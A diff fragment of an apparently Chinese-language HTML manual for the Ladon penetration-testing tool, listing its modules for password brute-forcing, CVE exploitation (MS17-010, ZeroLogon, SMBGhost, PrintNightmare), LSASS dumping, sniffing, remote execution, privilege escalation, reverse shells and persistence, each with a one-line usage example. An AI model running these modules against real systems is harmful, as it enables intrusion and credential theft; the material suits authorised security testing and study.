+<td><a href="http://k8gege.org/Ladon/SmbHashScan.html">SmbHashScan</a></td>
+<td>SMB HASH密码爆破(Windows)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://k8gege.org/Ladon/WmiHashScan.html">WmiHashScan</a></td>
+<td>WMI HASH密码爆破(Windows)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/Ladon/sshscan.html">SshScan</a></td>
+<td>SSH密码爆破(Linux)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://k8gege.org/Ladon/MssqlScan.html">MssqlScan</a></td>
+<td>Mssql数据库密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>9</td>
+<td><a href="http://k8gege.org/Ladon/OracleScan.html">OracleScan</a></td>
+<td>Oracle数据库密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td><a href="http://k8gege.org/Ladon/MysqlScan.html">MysqlScan</a></td>
+<td>Mysql数据库密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td><a href="http://k8gege.org/Ladon/weblogicScan.html">WeblogicScan</a></td>
+<td>Weblogic后台密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>12</td>
+<td><a href="http://k8gege.org/Ladon/VncScan.html">VncScan</a></td>
+<td>VNC远程桌面密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>13</td>
+<td><a href="http://k8gege.org/Ladon/ftpscan.html">FtpScan</a></td>
+<td>Ftp服务器密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>14</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Rar%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3">RarScan</a></td>
+<td>Rar压缩包密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td>Rar.exe</td>
+</tr>
+<tr>
+<td>15</td>
+<td><a href="http://k8gege.org/Ladon/TomcatScan.html">TomcatScan</a></td>
+<td>Tomcat后台登陆密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>16</td>
+<td><a href="http://k8gege.org/Ladon/HttpbasicScan.html">HttpBasicScan</a></td>
+<td>HttpBasic401认证密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>17</td>
+<td><a href="http://k8gege.org/Ladon/WinrmScan.html">WinrmScan</a></td>
+<td>Winrm认证密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>18</td>
+<td><a href="http://k8gege.org/Ladon/NbtScan.html">NbtScan</a></td>
+<td>Netbios密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>19</td>
+<td><a href="http://k8gege.org/Ladon/dvrscan.html">DvrScan</a></td>
+<td>摄像头密码爆破</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x004-漏洞检测-漏洞利用-12">0x004 漏洞检测/漏洞利用(12)</h4>
+<p>例子: Ladon MS17010<br>
+例子: Ladon 192.168.1.8/24 MS17010<br>
+例子: Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> WeblogicExp</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-MS17010%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">MS17010</a></td>
+<td>SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/Ladon/example.html">SMBGhost</a></td>
+<td>SMBGhost远程溢出漏洞检测 （CVE-2020-0796）</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit">WeblogicPoc</a></td>
+<td>Weblogic漏洞检测(CVE-2019-2725/<a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894">CVE-2018-2894</a>)</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B">PhpStudyPoc</a></td>
+<td>PhpStudy后门检测(phpstudy 2016/phpstudy 2018)</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F--CVE-2016-3088">ActivemqPoc</a></td>
+<td>ActiveMQ漏洞检测(CVE-2016-3088)</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2017-12615">TomcatPoc</a></td>
+<td>Tomcat漏洞检测(CVE-2017-12615)</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit">WeblogicExp</a></td>
+<td>Weblogic漏洞利用(CVE-2019-2725)</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2017-12615">TomcatExp</a></td>
+<td>Tomcat漏洞利用(CVE-2017-12615)</td>
+</tr>
+<tr>
+<td>9</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-Struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">Struts2Poc</a></td>
+<td>Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</td>
+</tr>
+<tr>
+<td>10</td>
+<td><a href="http://k8gege.org/Ladon/cve-2020-1472.html">ZeroLogon</a></td>
+<td>CVE-2020-1472域控提权漏洞EXP</td>
+</tr>
+<tr>
+<td>11</td>
+<td><a href="http://k8gege.org/Ladon/cve-2020-0688.html">CVE-2020-0688</a></td>
+<td>CVE-2020-0688 Exchange序列化漏洞利用</td>
+</tr>
+<tr>
+<td>12</td>
+<td><a href="http://k8gege.org/p/smbghost_cve_2020_0796.html">CVE-2020-0796</a></td>
+<td>SMBGhost Win10远程漏洞</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x005-加密解密-4">0x005 加密解密(4)</h4>
+<p>例子: Ladon 字符串 EnHex<br>
+例子: Ladon EnHex (批量str.txt)</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81">EnHex</a></td>
+<td>批量Hex密码加密</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81">DeHex</a></td>
+<td>批量Hex密码解密</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81">EnBase64</a></td>
+<td>批量Base64密码加密</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81">DeBase64</a></td>
+<td>批量Base64密码解密</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x006-下载功能-2">0x006 下载功能(2)</h4>
+<p>下载功能主要用于内网文件传输或者将VPS文件下载至目标机器</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>HttpDownLoad</td>
+<td>HTTP下载</td>
+<td>Ladon HttpDownLoad <a href="http://k8gege.org/test.exe">http://k8gege.org/test.exe</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>FtpDownLoad</td>
+<td>Ftp下载</td>
+<td>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x007-网络嗅探-3">0x007 网络嗅探(3)</h4>
+<p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>
+主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>
+后续可能会添加其它功能可能另外写个专门用于嗅探的工具<br>
+PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>
+重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>
+当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/p/56393.html">FtpSniffer/SnifferFtp</a></td>
+<td>Ftp密码嗅探</td>
+<td>Ladon FtpSniffer 192.168.1.5</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/p/qqkey.html">HttpSniffer/SnifferHTTP</a></td>
+<td>HTTP密码嗅探</td>
+<td>Ladon HTTPSniffer 192.168.1.5</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/p/56393.html">Sniffer</a></td>
+<td>网络嗅探(源地址、目标地址)</td>
+<td>Ladon Sniffer</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x008-密码读取-3">0x008 密码读取(3)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/p/56393.html">EnumIIS/IisPwd</a></td>
+<td>IIS站点密码读取</td>
+<td>Ladon EnumIIS 或 Ladon IisPwd</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/p/55476.html">DumpLsass </a></td>
+<td>DumpLsass内存密码</td>
+<td>Ladon DumpLsass</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/Ladon/GetWinAuth.html">web</a></td>
+<td>捕获Win密码</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x009-信息收集-12">0x009 信息收集(12)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/p/56393.html">EnumProcess/ProcessList/tasklist</a></td>
+<td>进程详细信息</td>
+<td>Ladon EnumProcess 或 Ladon Tasklist</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/p/56393.html">GetCmdLine/CmdLine</a></td>
+<td>获取命令行参数</td>
+<td>Ladon cmdline 或 Ladon cmdline cmd.exe</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/p/56393.html">GetInfo/GetInfo2</a></td>
+<td>获取渗透基础信息</td>
+<td>Ladon GetInfo 或 Ladon GetInfo2</td>
+</tr>
+<tr>
+<td>4</td>
+<td>GetPipe</td>
+<td>查看本机命名管道</td>
+<td>Ladon GetPipe</td>
+</tr>
+<tr>
+<td>5</td>
+<td>RdpLog</td>
+<td>查看3389连接记录</td>
+<td>Ladon RdpLog</td>
+</tr>
+<tr>
+<td>6</td>
+<td>QueryAdmin</td>
+<td>查看管理员组用户</td>
+<td>Ladon QueryAdmin</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/">NetVer</a></td>
+<td>查看安装.NET版本</td>
+<td>Ladon NetVer 或 Ladon NetVersion</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://k8gege.org/">PsVer</a></td>
+<td>查看PowerShell版本</td>
+<td>Ladon PsVer 或 Ladon PSVersion</td>
+</tr>
+<tr>
+<td>9</td>
+<td>whoami</td>
+<td>查看当前用户与特权</td>
+<td>Ladon whoami</td>
+</tr>
+<tr>
+<td>10</td>
+<td>recent</td>
+<td>查看用户最近访问文件</td>
+<td>Ladon recent</td>
+</tr>
+<tr>
+<td>11</td>
+<td>AllVer</td>
+<td>获取已安装程序列表</td>
+<td>Ladon AllVer</td>
+</tr>
+<tr>
+<td>12</td>
+<td><a href="http://k8gege.org/p/56393.html">Usblog</a></td>
+<td>查看USB使用记录</td>
+<td>Ladon Usblog</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x010-远程执行-8">0x010 远程执行(8)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">WmiExec</a></td>
+<td>135端口执行命令</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">PsExec</a></td>
+<td>445端口执行命令</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">AtExec</a></td>
+<td>445端口执行命令</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">SshExec</a></td>
+<td>22端口执行命令</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td><a href="http://k8gege.org/p/ladon_cs_shell.html">JspShell</a></td>
+<td>Jsp一句话执行命令</td>
+<td><a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://k8gege.org/Ladon/webshell.html">WebShell</a></td>
+<td>WebShell执行命令</td>
+<td><a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/Ladon/webshell.html">WebShell</a></td>
+<td>CVE-2020-17144</td>
+<td><a href="http://k8gege.org/p/CVE-2020-17144.html">http://k8gege.org/p/CVE-2020-17144.html</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://k8gege.org/Ladon/WinrmExec.html">WinrmExec</a></td>
+<td>5895端口执行命令</td>
+<td><a href="http://k8gege.org/Ladon/WinrmExec.html">http://k8gege.org/Ladon/WinrmExec.html</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td><a href="http://k8gege.org/Ladon/SmbExec.html">SmbExec</a></td>
+<td>445端口HASH执行命令</td>
+<td><a href="http://k8gege.org/Ladon/SmbExec.html">http://k8gege.org/Ladon/SmbExec.html</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x011-提权降权-9">0x011 提权降权(9)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/p/39070.html">BypassUac</a></td>
+<td>绕过UAC执行,支持Win7-Win10</td>
+<td>Ladon BypassUac c:\1.exe 或 Ladon BypassUac c:\1.bat</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/p/55476.html">GetSystem</a></td>
+<td>提权或降权运行程序</td>
+<td>Ladon GetSystem cmd.exe 或 Ladon GetSystem cmd.exe explorer</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/Ladon/runas.html">Runas</a></td>
+<td>模拟用户执行命令</td>
+<td>Ladon Runas user pass cmd</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a href="http://k8gege.org/p/55476.html">ms16135</a></td>
+<td>提权至SYSTEM</td>
+<td>Ladon ms16135 whoami</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a href="http://k8gege.org/Ladon/potato.html">BadPotato</a></td>
+<td>IIS或服务用户提权至SYSTEM</td>
+<td>Ladon BadPotato cmdline</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://k8gege.org/Ladon/potato.html">SweetPotato</a></td>
+<td>IIS或服务用户提权至SYSTEM</td>
+<td>Ladon SweetPotato cmdline</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html">SweetPotato</a></td>
+<td>Win10/2016提权至System</td>
+<td>Ladon SweetPotato cmdline</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://k8gege.org/Ladon/RdpHijack.html">RDPHijack</a></td>
+<td>远程桌面会话劫持</td>
+<td>Ladon RDPHijack sessionID</td>
+</tr>
+<tr>
+<td>9</td>
+<td><a href="http://k8gege.org/p/CVE-2021-1675.html">CVE-2021-1675</a></td>
+<td>打印机漏洞提权</td>
+<td>Ladon CVE-2021-1675 c:\evil.dll</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x012-反弹Shell-4">0x012 反弹Shell(4)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>协议</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/Ladon/ReverseShell.html">netcat</a></td>
+<td>反弹Shell系列教程</td>
+<td>TCP</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/Ladon/ReverseShell.html">MSF_Shell</a></td>
+<td>反弹Shell系列教程</td>
+<td>TCP/HTTP/HTTPS</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/Ladon/ReverseShell.html">PowerCat</a></td>
+<td>反弹Shell系列教程</td>
+<td>TCP/UDP/ICMP</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a href="http://k8gege.org/Ladon/ReverseShell.html">MSF_Meter</a></td>
+<td>反弹Shell系列教程</td>
+<td>TCP/HTTP/HTTPS</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a href="http://k8gege.org/Ladon/runas.html">runas</a></td>
+<td>Runas反弹Shell</td>
+<td>TCP</td>
+</tr>
+</tbody>
+</table>
+<h4 id="端口转发">端口转发</h4>
+<p>1 | <a href="http://k8gege.org/Ladon/porttran.html">PortTran</a>   | 内网端口转发<br>
+2 | <a href="http://k8gege.org/Ladon/netsh.html">netsh</a>   | 系统命令端口转发</p>
+<h4 id="0x014-其它功能-12">0x014 其它功能(12)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/p/39070.html">EnableDotNet</a></td>
+<td><a target="_blank" rel="noopener" href="http://xn--4gqq4mst6a400a.net">一键启用.net</a> 3.5(2008系统默认未启用)</td>
+<td>Ladon EnableDotNet</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/p/39070.html">gethtml</a></td>
+<td>获取内网站点HTML源码</td>
+<td>Ladon gethtml <a target="_blank" rel="noopener" href="http://192.168.1.1">http://192.168.1.1</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/p/55476.html">CheckDoor</a></td>
+<td>检测后门(网上公开多年的)</td>
+<td>Ladon CheckDoor 或 Ladon AutoRun</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a href="http://k8gege.org/">GetIP</a></td>
+<td>获取本机内网IP与外网IP</td>
+<td>Ladon GetIP</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a href="http://k8gege.org/">Open3389</a></td>
+<td>一键开启3389</td>
+<td>Ladon Open3389</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://k8gege.org/">ActiveAdmin</a></td>
+<td>激活内置用户Administrator</td>
+<td>Ladon ActiveAdmin</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/">ActiveGuest</a></td>
+<td>激活内置用户Guest</td>
+<td>Ladon ActiveGuest</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://k8gege.org/">RunPS</a></td>
+<td>无PowerShell.exe执行PowerShell脚本</td>
+<td>Ladon RunPS *.ps1</td>
+</tr>
+<tr>
+<td>9</td>
+<td>RegAuto</td>
+<td>添加注册表RUN启动项</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td>sc</td>
+<td>服务加启动项(system权限)</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td>sc</td>
+<td>服务执行程序(system权限)</td>
+<td></td>
+</tr>
+<tr>
+<td>12</td>
+<td>at</td>
+<td>计划执行程序(无需时间)(system权限)</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br>
+中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br>
+高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。</p>
+<h3 id="外部插件模块-21">外部插件模块(21)</h3>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>功能</th>
+<th>实现语言</th>
+<th>功能说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>漏洞扫描</td>
+<td>C语言</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">CVE 2019-0708 Windows Rdp 3389漏洞批量检测</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>漏洞利用</td>
+<td>Exp生成器</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit">ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td>漏洞利用</td>
+<td>Python</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/ZimbraExploit">CVE-2019-9621 Zimbra GetShell Exploit</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td>漏洞利用</td>
+<td>Python</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-0604">CVE-2019-0604 SharePoint GetShell Exploit</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td>漏洞利用</td>
+<td>Exp生成器</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit">CVE 2016-3088 ActiveMQ GetShell Exploit</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td>漏洞利用</td>
+<td>Python</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/SolrExp">Apache Solr 8.2.0 Velocity RCE 0day Exploit</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td>漏洞利用</td>
+<td>Exp生成器</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8">PhpStudy后门 GetShell Exploit</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td>命令执行</td>
+<td>INI配置</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7">INI调用外部程序命令批量Linux上控</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td>命令执行</td>
+<td>INI配置</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7">INI调用外部程序命令批量Windowns上控</a></td>
+</tr>
+<tr>
+<td>10</td>
+<td>漏洞扫描</td>
+<td>Python</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-11043">PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</a></td>
+</tr>
+<tr>
+<td>11</td>
+<td>漏洞扫描</td>
+<td>Exp生成器</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894">Weblogic CVE-2018-2894漏洞检测</a></td>
+</tr>
+<tr>
+<td>12</td>
+<td>漏洞利用</td>
+<td>PowerShell</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/MS17010EXP">MS17010EXP 永恒之蓝漏洞利用</a></td>
+</tr>
+<tr>
+<td>13</td>
+<td>脚本调用</td>
+<td>PowerShell</td>
+<td><a href="http://k8gege.org/p/32e1a912.html">Kali 2019无PowerShell执行脚本</a></td>
+</tr>
+<tr>
+<td>14</td>
+<td>口令扫描</td>
+<td>INI配置</td>
+<td><a href="http://k8gege.org/p/55476.html">ipcscan.ini INI插件之Ipc密码爆破</a></td>
+</tr>
+<tr>
+<td>15</td>
+<td>口令扫描</td>
+<td>INI配置</td>
+<td><a href="http://k8gege.org/p/55476.html">smbscan.ini INI插件之Smb密码爆破</a></td>
+</tr>
+<tr>
+<td>16</td>
+<td>口令扫描</td>
+<td>INI配置</td>
+<td><a href="http://k8gege.org/p/55476.html">smbhash.ini INI插件之NtlmHash爆破</a></td>
+</tr>
+<tr>
+<td>17</td>
+<td>口令扫描</td>
+<td>INI配置</td>
+<td><a href="http://k8gege.org/Ladon/WinrmScan.html">winrmscan.ini INI插件之Winrm密码爆破</a></td>
+</tr>
+<tr>
+<td>18</td>
+<td>信息收集</td>
+<td>.NET</td>
+<td><a href="http://k8gege.org/Ladon/IsShiro.html">检测网站是否使用Shiro</a></td>
+</tr>
+<tr>
+<td>19</td>
+<td>漏洞扫描</td>
+<td>Python</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2020-1472-EXP">域控提权CVE-2020-1472-EXP</a></td>
+</tr>
+<tr>
+<td>20</td>
+<td>漏洞利用</td>
+<td>Exp生成器</td>
+<td><a href="http://k8gege.org/p/CVE-2018-7600.html">Drupal CVE-2018-7600</a></td>
+</tr>
+<tr>
+<td>21</td>
+<td><a href="http://k8gege.org/p/smbghost_cve_2020_0796.html">CVE-2020-0796</a></td>
+<td>SMBGhost Win10远程漏洞</td>
+<td></td>
+</tr>
+<tr>
+<td>22</td>
+<td>漏洞利用</td>
+<td>Exp生成器</td>
+<td><a href="http://k8gege.org/Ladon/iisput.html">IIS写权限漏洞利用</a></td>
+</tr>
+</tbody>
+</table>
+<p>文档参考Cscan: <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki">https://github.com/k8gege/K8CScan/wiki</a></p>
+<h3 id="中级用法">中级用法</h3>
+<h3 id="批量扫描">批量扫描</h3>
+<p>0x001 参数 ip/24 ip/16 ip/8<br>
+命令: Ladon 192.168.1.8/24 OnlinePC</p>
+<p>0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br>
